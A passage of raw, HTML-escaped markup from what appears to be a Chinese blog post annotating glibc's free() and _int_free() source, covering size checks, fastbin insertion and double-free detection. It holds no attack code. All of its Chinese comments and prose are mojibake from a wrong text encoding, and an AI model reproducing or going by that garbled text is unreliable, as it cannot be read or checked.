class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!mp_.no_dyn_threshold&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;amp;&amp;amp; chunksize_nomask (p) &amp;gt; mp_.mmap_threshold&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          &amp;amp;&amp;amp; chunksize_nomask (p) &amp;lt;= DEFAULT_MMAP_THRESHOLD_MAX&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &amp;amp;&amp;amp; !DUMPED_MAIN_ARENA_CHUNK (p))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          mp_.mmap_threshold = chunksize (p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          mp_.trim_threshold = &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * mp_.mmap_threshold;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt;,&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                      mp_.mmap_threshold, mp_.trim_threshold);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      munmap_chunk (p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  MAYBE_INIT_TCACHE ();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  ar_ptr = arena_for_chunk (p); &lt;span class=&#34;comment&#34;&gt;//УјитЙЌТїЄтљЉarenaуџёТїЄжњѕ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  _int_free (ar_ptr, p, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//У░ЃућеinitтЄйТЋ░У┐ЏУАїжЄіТћЙ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&#34;_int_free&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#_int_free&#34;&gt;#&lt;/a&gt; _int_free()№╝џ&lt;/h3&gt;
&lt;p&gt;РђІ	тЄйТЋ░т╝ђтц┤тЁѕт«џС╣ЅС║єСИђС║ЏтѕЌТЅђжюђуџётЈўжЄЈ№╝їт╣ХУјитЙЌУдЂжЄіТћЙуџё chunk уџётцДт░Ј№╝їт╣Хт»╣ chunk тЂџСИђС║ЏТБђТЪЦсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;static&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;void&lt;/span&gt; _int_free (mstate av, mchunkptr p, &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; have_lock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T size;        &lt;span class=&#34;comment&#34;&gt;/* its size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mfastbinptr *fb;             &lt;span class=&#34;comment&#34;&gt;/* associated fastbin */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr nextchunk;         &lt;span class=&#34;comment&#34;&gt;/* next contiguous chunk */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T nextsize;    &lt;span class=&#34;comment&#34;&gt;/* its size */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; nextinuse;               &lt;span class=&#34;comment&#34;&gt;/* true if nextchunk is used */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  INTERNAL_SIZE_T prevsize;    &lt;span class=&#34;comment&#34;&gt;/* size of previous contiguous chunk */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr bck;               &lt;span class=&#34;comment&#34;&gt;/* misc temp for linking */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  mchunkptr fwd;               &lt;span class=&#34;comment&#34;&gt;/* misc temp for linking */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  size = chunksize (p);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* Little security check which won&amp;#x27;t hurt performance: the&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     allocator never wrapps around at the end of the address space.&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     Therefore we can exclude some size values which might appear&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     here by accident or by &amp;quot;design&amp;quot; from some intruder.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//уггСИђСИфТЮАС╗ХуГЏжђЅТјЅСИђС║ЏуЅ╣тѕФтцДуџёsize№╝їуггС║їСИфТЮАС╗ХТБђТЪЦchunkТў»тљдт»╣жйљ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect ((&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;) p &amp;gt; (&lt;span class=&#34;type&#34;&gt;uintptr_t&lt;/span&gt;) -size, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      || __builtin_expect (misaligned_chunk (p), &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;free(): invalid pointer&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;comment&#34;&gt;/* We know that each chunk is at least MINSIZE bytes in size or a&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;     multiple of MALLOC_ALIGNMENT.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//тѕєтѕФТБђТЪЦsizeТў»тљдУ┐Єт░ЈС╗ЦтЈіsizeТў»тљдт»╣тЁХ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__glibc_unlikely (size &amp;lt; MINSIZE || !aligned_OK (size)))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;free(): invalid size&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;  check_inuse_chunk(av, p); &lt;span class=&#34;comment&#34;&gt;//С╗ЁтйЊт«џС╣ЅС║єMalloc_DebugТЌХСй┐уће&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	уёХтљј№╝їтѕцТќГУ»Ц chunk Тў»тљдтюе fast bin УїЃтЏ┤тєЁ№╝їтдѓТъюТў»№╝їтѕЎТЈњтЁЦ fast bin СИГсђѓ&lt;/p&gt;
&lt;figure class=&#34;highlight c&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;68&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;69&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;70&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;71&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;72&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;73&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;74&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;75&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;76&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//тдѓТъюsize т░ЈС║јglobal_max_fast,тѕЎт░єтЁХтіатЁЦfast binСИГ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; ((&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)(size) &amp;lt;= (&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;long&lt;/span&gt;)(get_max_fast ())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; TRIM_FASTBINS&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;comment&#34;&gt;/*&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	If TRIM_FASTBINS set, don&amp;#x27;t place chunks&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	bordering top into fastbins&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;      */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//TRIM_FASTBINSж╗ўУ«цСИ║0№╝їСИЇС╝џт░єСИјTop chunkжЮаУ┐Љуџёfast binтѕаТјЅ&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;amp;&amp;amp; (chunk_at_offset(p, size) != av-&amp;gt;top)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;endif&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      ) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//ТБђТЪЦСИІСИђСИфchunkуџётцДт░Ј№╝їСИЇУЃйт░ЈС║ј2*SIZE№╝їС╣ЪСИЇУЃйтцДС║јav-&amp;gt;system_mem&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (chunksize_nomask (chunk_at_offset (p, size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			  &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * SIZE_SZ, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	|| __builtin_expect (chunksize (chunk_at_offset (p, size))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;			     &amp;gt;= av-&amp;gt;system_mem, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;type&#34;&gt;bool&lt;/span&gt; fail = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;/* We might not have a lock at this point and concurrent modifications&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	   of system_mem might result in a false positive.  Redo the test after&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	   getting the lock.  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!have_lock)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    __libc_lock_lock (av-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    fail = (chunksize_nomask (chunk_at_offset (p, size)) &amp;lt;= &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * SIZE_SZ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;		    || chunksize (chunk_at_offset (p, size)) &amp;gt;= av-&amp;gt;system_mem);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    __libc_lock_unlock (av-&amp;gt;mutex);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (fail)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;free(): invalid next size (fast)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//жЄіТћЙС╣ІтЅЇт░єuser dataжЃетѕєтАФтЁЁСИ║ perturb byte&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    free_perturb (chunk2mem(p), size - &lt;span class=&#34;number&#34;&gt;2&lt;/span&gt; * SIZE_SZ);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//тюеavСИГУ«Йуй«СйЇ№╝їУАеуц║fast binСИГТюЅ free chunk&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    atomic_store_relaxed (&amp;amp;av-&amp;gt;have_fastchunks, &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; idx = fastbin_index(size);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    fb = &amp;amp;fastbin (av, idx);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;//жђџУ┐ЄтјЪтГљТЊЇСйют░єpТЈњтЁЦfast bin&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Atomically link P to its fastbin: P-&amp;gt;FD = *FB; *FB = P;  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    mchunkptr old = *fb, old2;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (SINGLE_THREAD_P)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;comment&#34;&gt;/* Check that the top of the bin is not the record we are going to&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	   add (i.e., double free).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (old == p, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)) &lt;span class=&#34;comment&#34;&gt;//у«ђтЇЋТБђТЪЦ№╝їfast binСИГуџёуггСИђСИфchunk Тў»СИЇТў»тѕџтѕџуџёchunk№╝їжў▓ТГбdoubble free&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;double free or corruption (fasttop)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	p-&amp;gt;fd = PROTECT_PTR (&amp;amp;p-&amp;gt;fd, old);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	*fb = p;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;comment&#34;&gt;/* Check that the top of the bin is not the record we are going to&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;	     add (i.e., double free).  */&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (__builtin_expect (old == p, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	    malloc_printerr (&lt;span class=&#34;string&#34;&gt;&amp;quot;double free or corruption (fasttop)&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  old2 = old;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	  p-&amp;gt;fd = PROTECT_PTR (&amp;amp;p-&amp;gt;fd, old);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;      &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; ((old = catomic_compare_and_exchange_val_rel (fb, p, old2))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;	     != old2);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;/* Check that size of fastbin chunk at the top is the same as&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span 